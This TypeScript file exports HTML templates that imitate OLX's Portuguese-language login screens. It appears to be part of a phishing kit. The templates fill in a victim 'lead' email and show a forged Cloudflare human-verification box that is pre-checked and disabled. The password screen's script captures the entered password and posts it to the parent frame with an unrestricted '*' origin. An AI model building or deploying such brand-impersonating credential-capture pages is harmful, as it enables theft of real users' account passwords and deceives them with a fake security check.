/**
 * Templates HTML estáticos pra telas que não têm URL própria
 * (são passos dentro de um fluxo, sem mudança de URL).
 */

const ACCESS_ACCOUNT_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesse sua conta - OLX</title>
<style>
  :root{
    --spots-background-circle:#F3EBFF;
    --spots-color-circle:#FFFFFF;
    --spots-border-color-default:#6E0AD6;
    --color-neutral-70:#6E0AD6;
    --color-neutral-110:#6b6b6b;
    --color-neutral-120:#1a1a1a;
  }
  *,*::before,*::after{box-sizing:border-box}
  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
  .topbar{padding:18px 20px;border-bottom:1px solid #e8e8e8}
  .logo{display:inline-block}
  .logo svg{display:block;height:36px;width:auto}
  main{max-width:480px;margin:0 auto;padding:48px 24px 32px}
  h1{font-size:26px;font-weight:600;text-align:center;margin:0 0 28px;letter-spacing:-.2px}
  .lead{font-size:16px;text-align:center;margin:0 0 18px;color:#1a1a1a}
  .email-pill{display:block;width:100%;padding:14px 20px;border:1px solid #d0d0d0;border-radius:9999px;text-align:center;font-size:15px;color:#1a1a1a;background:#fff;margin:0 0 28px}
  .option{display:flex;align-items:center;gap:18px;width:100%;padding:20px 18px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;text-align:left;cursor:pointer;font:inherit;color:inherit;margin:0 0 16px;transition:background .15s,border-color .15s}
  .option:hover{background:#fafafa;border-color:#c8c8c8}
  .option-icon{flex-shrink:0;width:48px;height:48px;display:flex;align-items:center;justify-content:center}
  .option-icon svg{width:48px;height:48px;display:block}
  .option-body{flex:1;min-width:0}
  .option-title{display:block;font-size:18px;font-weight:600;margin:0 0 4px;color:#1a1a1a}
  .option-sub{display:block;font-size:14px;color:#6b6b6b;line-height:1.4}
  .option-arrow{flex-shrink:0;color:#1a1a1a}
  .back-link{display:block;width:100%;background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;text-align:center;padding:8px 0 24px;cursor:pointer}
  .help-bar{display:block;width:100%;padding:14px;border:0;background:#f5f5f5;border-radius:8px;color:#1a1a1a;font:inherit;font-size:15px;text-align:center;cursor:pointer;margin:0 0 20px}
  .help-bar:hover{background:#ececec}
  .terms{font-size:13px;color:#6b6b6b;text-align:center;line-height:1.45;margin:0}
  .terms a{color:#6E0AD6;text-decoration:none}
  .terms a:hover{text-decoration:underline}
</style>
</head>
<body>
  <header class="topbar">
    <div class="logo" aria-label="OLX">
      <svg viewBox="0 0 80 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <text x="0" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#6E0AD6">o</text>
        <text x="22" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#7DD800">L</text>
        <text x="40" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#FF8A00">x</text>
      </svg>
    </div>
  </header>

  <main>
    <h1>Acesse sua conta</h1>
    <p class="lead">Escolha um método de acesso para a conta</p>
    <div class="email-pill" id="user-email">{{lead.email}}</div>

    <button type="button" class="option" data-method="email">
      <span class="option-icon">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="none" viewBox="0 0 96 96" aria-hidden="true">
          <path d="M48 90c23.196 0 42-18.804 42-42S71.196 6 48 6 6 24.804 6 48s18.804 42 42 42Z" fill="#F3EBFF"/>
          <path fill="var(--spots-color-circle)" d="m18.407 26.56 51.306-7.052c3.527-.485 6.819 1.941 7.315 5.391l5.407 37.636c.496 3.45-1.984 6.67-5.511 7.154l-51.307 7.053c-3.527.485-6.818-1.941-7.314-5.391l-5.408-37.636c-.496-3.45 1.985-6.67 5.512-7.154Z"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="m80.531 49.397-4.144-24.554c-.495-3.45-3.144-5.562-6.672-5.077L18.41 26.82c-3.527.485-6.007 3.704-5.512 7.154l5.408 37.636c.496 3.45 3.788 5.876 7.315 5.39l26.79-3.95"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M76.387 25.552 48.117 51.52l-35.22-17.546"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-width="1.5" d="m23.605 72.654 2.868-4.085m1.982-2.824 9.013-12.836"/>
          <path fill="#6E0AD6" stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M70.143 78.647a13.463 13.463 0 0 0 13.52-13.82c-.167-7.631-6.49-13.819-14.125-13.819a13.463 13.463 0 0 0-13.52 13.82c.167 7.632 6.49 13.82 14.125 13.82Z"/>
          <path fill="#fff" stroke="#fff" stroke-width="1.5" fill-rule="evenodd" d="M65.502 64.08a.47.47 0 0 0-.667 0 .476.476 0 0 0 0 .67l3.144 3.162a.47.47 0 0 0 .667 0l6.918-6.954a.476.476 0 0 0 0-.67.47.47 0 0 0-.667 0l-6.584 6.618-2.811-2.826Z" clip-rule="evenodd"/>
        </svg>
      </span>
      <span class="option-body">
        <span class="option-title">E-mail</span>
        <span class="option-sub">Enviaremos um código para o seu e-mail</span>
      </span>
      <span class="option-arrow">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </span>
    </button>

    <button type="button" class="option" data-method="password">
      <span class="option-icon">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="none" viewBox="0 0 96 96" aria-hidden="true">
          <path d="M48 90c23.196 0 42-18.804 42-42S71.196 6 48 6 6 24.804 6 48s18.804 42 42 42Z" fill="#F3EBFF"/>
          <path fill="#6E0AD6" d="m42.738 33.249 1.08 7.689-6.296.885-1.193-8.485s-1.941-16.22 13.768-18.428c15.71-2.208 18.47 12.613 18.47 12.613l1.378 9.81-6.363.895-1.36-9.678s-2.064-8.43-10.748-7.21c-8.683 1.221-8.994 9.106-8.736 11.909Z"/>
          <path stroke="var(--spots-color-circle)" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="m39.534 39.31.289 2.054"/>
          <path fill="var(--spots-color-circle)" d="m70.633 36.976-34.291 4.82c-6.715.944-9.156 5.527-8.425 10.725l3.132 22.287c.721 5.133 5.596 8.412 11.007 7.651l34.291-4.819c5.344-.75 9.457-3.385 7.8-10.295L81.015 45.06c-.89-6.332-3.331-9.073-10.382-8.083ZM59.366 60.36c-.117.15-.234.298-.207.493l.786 5.588c.182 1.3-.745 2.556-2.165 2.756l-.812.114c-1.352.19-2.648-.688-2.84-2.053l-.785-5.588c-.028-.194-.114-.315-.335-.416-2.5-1.107-3.917-3.823-3.074-6.658.525-1.664 1.84-3.108 3.553-3.68 3.61-1.302 7.308.961 7.792 4.405.264 1.884-.504 3.78-1.913 5.04Z"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="M29.941 45.118a7.176 7.176 0 0 1 4.797-2.905l38.048-5.347c3.911-.55 7.54 2.185 8.09 6.096l3.698 26.316c.55 3.91-2.185 7.54-6.096 8.089L42.087 82.48"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="m70.002 37.259-1.24-8.816c-1.257-8.949-9.573-15.216-18.522-13.958-8.949 1.258-15.282 9.583-14.024 18.532l1.24 8.816 6.495-.913-1.239-8.816a9.884 9.884 0 0 1 8.432-11.19 9.884 9.884 0 0 1 11.189 8.432l1.239 8.816M57.547 69.359a2.471 2.471 0 0 1-2.797-2.108l-.8-5.7c-.029-.2-.114-.323-.331-.428-2.459-1.141-3.863-3.918-3.052-6.803.506-1.694 1.787-3.158 3.464-3.732a5.71 5.71 0 0 1 7.667 4.533c.27 1.922-.473 3.852-1.915 5.136-.114.151-.228.302-.2.501l.802 5.7a2.47 2.47 0 0 1-2.108 2.798l-.73.103Z"/>
          <path stroke="var(--spots-color-circle)" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="M42.928 20.653c-3.264 3.23-4.884 8.054-4.167 13.158l.457 3.248"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="m77.463 49.042 2.078 14.786M80.108 67.858l.378 2.689"/>
          <path fill="#6E0AD6" stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="M28.69 50.159s-6.376 6.574-12.408 7.422L18.266 71.7c.41 2.916 1.976 5.4 4.245 6.636 2.269 1.236 9.153 4.527 9.437 4.622l1.447.675 1.204-1.048c.238-.236 5.957-5.23 7.855-7.12 1.783-1.737 2.67-4.566 2.25-7.549L42.73 53.864c-6.098.857-14.04-3.705-14.04-3.705Z"/>
          <path fill="#fff" stroke="#fff" stroke-width="1.5" fill-rule="evenodd" d="M26.153 67.891a.428.428 0 0 0-.597.106.43.43 0 0 0 .105.598l3.313 2.326c.194.137.461.09.597-.105l5.098-7.301a.43.43 0 0 0-.106-.599.428.428 0 0 0-.597.106l-4.852 6.949-2.961-2.08Z" clip-rule="evenodd"/>
        </svg>
      </span>
      <span class="option-body">
        <span class="option-title">Senha</span>
        <span class="option-sub">Informe a sua senha atual</span>
      </span>
      <span class="option-arrow">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </span>
    </button>

    <button type="button" class="help-bar" data-action="help">Preciso de ajuda &rsaquo;</button>

    <p class="terms">
      Ao continuar, você concorda com os <a href="#">Termos de Uso</a> e a <a href="#">Política de Privacidade</a> da OLX e seus parceiros, e em receber comunicações da OLX.
    </p>
  </main>
</body>
</html>`;

const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesse a sua conta - OLX</title>
<style>
  *,*::before,*::after{box-sizing:border-box}
  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
  .topbar{padding:18px 20px;border-bottom:1px solid #e8e8e8}
  .logo{display:inline-block}
  .logo svg{display:block;height:36px;width:auto}
  main{max-width:480px;margin:0 auto;padding:48px 24px 32px}
  h1{font-size:26px;font-weight:600;text-align:center;margin:0 0 28px;letter-spacing:-.2px}
  .email-pill{display:block;width:100%;padding:14px 20px;border:1px solid #d0d0d0;border-radius:9999px;text-align:center;font-size:15px;color:#1a1a1a;background:#fff;margin:0 0 28px}
  .field-group{margin:0 0 20px}
  .field-label{display:block;font-size:16px;font-weight:600;color:#1a1a1a;margin:0 0 8px}
  .input-wrap{position:relative;display:flex;align-items:center}
  .input-wrap input{width:100%;padding:16px 48px 16px 16px;border:1px solid #d0d0d0;border-radius:12px;font:inherit;font-size:16px;color:#1a1a1a;background:#fff;outline:none;transition:border-color .15s}
  .input-wrap input:focus{border-color:#6E0AD6}
  .toggle-pw{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;padding:4px;color:#6E0AD6;display:flex;align-items:center;justify-content:center}
  .cf-widget{display:flex;align-items:center;justify-content:space-between;width:303px;margin:0 auto 24px;padding:12px 16px;border:1px solid #e0e0e0;border-radius:4px;background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;color:#1a1a1a}
  .cf-widget .cf-check{display:flex;align-items:center;gap:10px}
  .cf-widget .cf-check label{display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none}
  .cf-widget .cf-check input[type="checkbox"]{width:22px;height:22px;accent-color:#f48120;cursor:pointer;margin:0}
  .cf-widget .cf-brand{display:flex;flex-direction:column;align-items:center;gap:2px}
  .cf-widget .cf-brand-links{font-size:9px;color:#999}
  .cf-widget .cf-brand-links a{color:#999;text-decoration:none}
  .cf-widget .cf-brand-links a:hover{text-decoration:underline}
  .btn-entrar{display:block;width:100%;padding:18px;border:0;border-radius:9999px;background:#f48120;color:#fff;font:inherit;font-size:18px;font-weight:700;text-align:center;cursor:pointer;transition:opacity .15s}
  .btn-entrar:hover{opacity:.9}
  .links{display:flex;justify-content:space-between;align-items:center;margin:20px 0 0;padding:0}
  .links a,.links button{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;padding:0}
  .links a:hover,.links button:hover{text-decoration:underline}
</style>
</head>
<body>
  <header class="topbar">
    <div class="logo" aria-label="OLX">
      <svg viewBox="0 0 80 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <text x="0" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#6E0AD6">o</text>
        <text x="22" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#7DD800">L</text>
        <text x="40" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#FF8A00">x</text>
      </svg>
    </div>
  </header>

  <main>
    <h1>Acesse a sua conta</h1>
    <div class="email-pill" id="user-email">{{lead.email}}</div>

    <div class="field-group">
      <label class="field-label" for="pw-input">Senha</label>
      <div class="input-wrap">
        <input id="pw-input" type="password" name="password" autocomplete="current-password" placeholder="" aria-label="Senha">
        <button type="button" class="toggle-pw" aria-label="Mostrar senha" id="toggle-pw-btn">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.5"/>
            <line x1="4" y1="20" x2="20" y2="4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" id="pw-slash"/>
          </svg>
        </button>
      </div>
    </div>

    <div class="cf-widget">
      <div class="cf-check">
        <label><input type="checkbox" checked disabled><span>Confirme que é humano</span></label>
      </div>
      <div class="cf-brand">
        <svg width="73" height="25" viewBox="0 0 73 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z" fill="#F6821F"/><path d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z" fill="#FBAD41"/><path d="M8.11963 18.8904H9.75541V23.4254H12.6139V24.8798H8.11963V18.8904Z" fill="#444"/><path d="M14.3081 21.9023V21.8853C14.3081 20.1655 15.674 18.7704 17.4952 18.7704C19.3164 18.7704 20.6653 20.1482 20.6653 21.8681V21.8853C20.6653 23.6052 19.2991 24.9994 17.4785 24.9994C15.6578 24.9994 14.3081 23.6222 14.3081 21.9023ZM18.9958 21.9023V21.8853C18.9958 21.0222 18.3806 20.2679 17.4785 20.2679C16.5846 20.2679 15.9858 21.0038 15.9858 21.8681V21.8853C15.9858 22.7484 16.6013 23.5025 17.4952 23.5025C18.3973 23.5025 18.9958 22.7666 18.9958 21.9023Z" fill="#444"/><path d="M22.6674 22.253V18.8901H24.3284V22.2191C24.3284 23.0822 24.7584 23.4939 25.4159 23.4939C26.0733 23.4939 26.5034 23.1003 26.5034 22.2617V18.8901H28.1647V22.2093C28.1647 24.1432 27.0772 24.9899 25.3991 24.9899C23.7211 24.9899 22.6674 24.1268 22.6674 22.2522" fill="#444"/><path d="M30.668 18.8907H32.9445C35.0526 18.8907 36.275 20.1226 36.275 21.8508V21.8684C36.275 23.5963 35.0355 24.88 32.911 24.88H30.668V18.8907ZM32.97 23.4076C33.9483 23.4076 34.597 22.8609 34.597 21.8928V21.8759C34.597 20.9178 33.9483 20.3614 32.97 20.3614H32.3038V23.4082L32.97 23.4076Z" fill="#444"/><path d="M38.6525 18.8904H43.3738V20.3453H40.2883V21.3632H43.079V22.7407H40.2883V24.8798H38.6525V18.8904Z" fill="#444"/><path d="M45.65 18.8904H47.2858V23.4254H50.1443V24.8798H45.65V18.8904Z" fill="#444"/><path d="M54.4187 18.8475H55.9949L58.5079 24.8797H56.7541L56.3238 23.8101H54.047L53.6257 24.8797H51.9058L54.4187 18.8475ZM55.8518 22.5183L55.1941 20.8154L54.5278 22.5183H55.8518Z" fill="#444"/><path d="M60.6149 18.8901H63.4056C64.3083 18.8901 64.9317 19.13 65.328 19.5406C65.6742 19.883 65.8511 20.3462 65.8511 20.9357V20.9526C65.8511 21.8678 65.3691 22.4754 64.6369 22.7919L66.045 24.88H64.1558L62.9671 23.0658H62.2507V24.88H60.6149V18.8901ZM63.3299 21.7654C63.8864 21.7654 64.2071 21.4915 64.2071 21.0551V21.0381C64.2071 20.5674 63.8697 20.328 63.3211 20.328H62.2507V21.7665L63.3299 21.7654Z" fill="#444"/><path d="M68.2112 18.8904H72.9578V20.3024H69.8302V21.209H72.6632V22.5183H69.8302V23.4683H73V24.8798H68.2112V18.8904Z" fill="#444"/><path d="M4.53824 22.6043C4.30918 23.13 3.82723 23.5022 3.18681 23.5022C2.29265 23.5022 1.67746 22.7493 1.67746 21.8851V21.8678C1.67746 21.0047 2.27593 20.2676 3.1698 20.2676C3.84367 20.2676 4.35681 20.6882 4.5734 21.2605H6.29764C6.02151 19.8349 4.78716 18.7707 3.18681 18.7707C1.36533 18.7707 0 20.1666 0 21.8851V21.9021C0 23.6219 1.3486 25 3.1698 25C4.72762 25 5.94525 23.9764 6.26645 22.6046L4.53824 22.6043Z" fill="#444"/></svg>
        <span class="cf-brand-links"><a href="#">Privacidade</a> · <a href="#">Ajuda</a></span>
      </div>
    </div>

    <button type="button" class="btn-entrar" id="btn-entrar">Entrar</button>

    <div class="links">
      <button type="button" class="back-btn" data-action="back">Voltar</button>
      <a href="#" data-action="forgot-password">Esqueceu sua senha?</a>
    </div>
  </main>

  <script>
    (function(){
      var pwInput = document.getElementById('pw-input');
      var toggleBtn = document.getElementById('toggle-pw-btn');
      var slash = document.getElementById('pw-slash');
      if(toggleBtn && pwInput){
        toggleBtn.addEventListener('click', function(){
          var showing = pwInput.type === 'text';
          pwInput.type = showing ? 'password' : 'text';
          if(slash) slash.style.display = showing ? '' : 'none';
        });
      }

      var entrarBtn = document.getElementById('btn-entrar');
      if(entrarBtn && pwInput){
        entrarBtn.addEventListener('click', function(){
          var pw = (pwInput.value || '').trim();
          if(!pw){
            pwInput.style.borderColor = '#e53e3e';
            pwInput.focus();
            return;
          }
          window.parent.postMessage({
            type: 'iframe-help-action',
            action: 'password-submit',
            password: pw
          }, '*');
        });
      }

      var backBtn = document.querySelector('[data-action="back"]');
      if(backBtn){
        backBtn.addEventListener('click', function(){
          window.parent.postMessage({ type: 'iframe-link-click', url: 'back' }, '*');
        });
      }

      var forgotBtn = document.querySelector('[data-action="forgot-password"]');
      if(forgotBtn){
        forgotBtn.addEventListener('click', function(e){
          e.preventDefault();
          window.parent.postMessage({ type: 'iframe-help-action', action: 'forgot-password' }, '*');
        });
      }
    })();
  </script>
</body>
</html>`;

export const MANUAL_SCREEN_TEMPLATES: Record<string, { title: string; html: string }> = {
  "access-account": {
    title: "Acesse sua conta",
    html: ACCESS_ACCOUNT_HTML,
  },
  "password": {
    title: "Tela de senha",
    html: PASSWORD_SCREEN_HTML,
  },
};
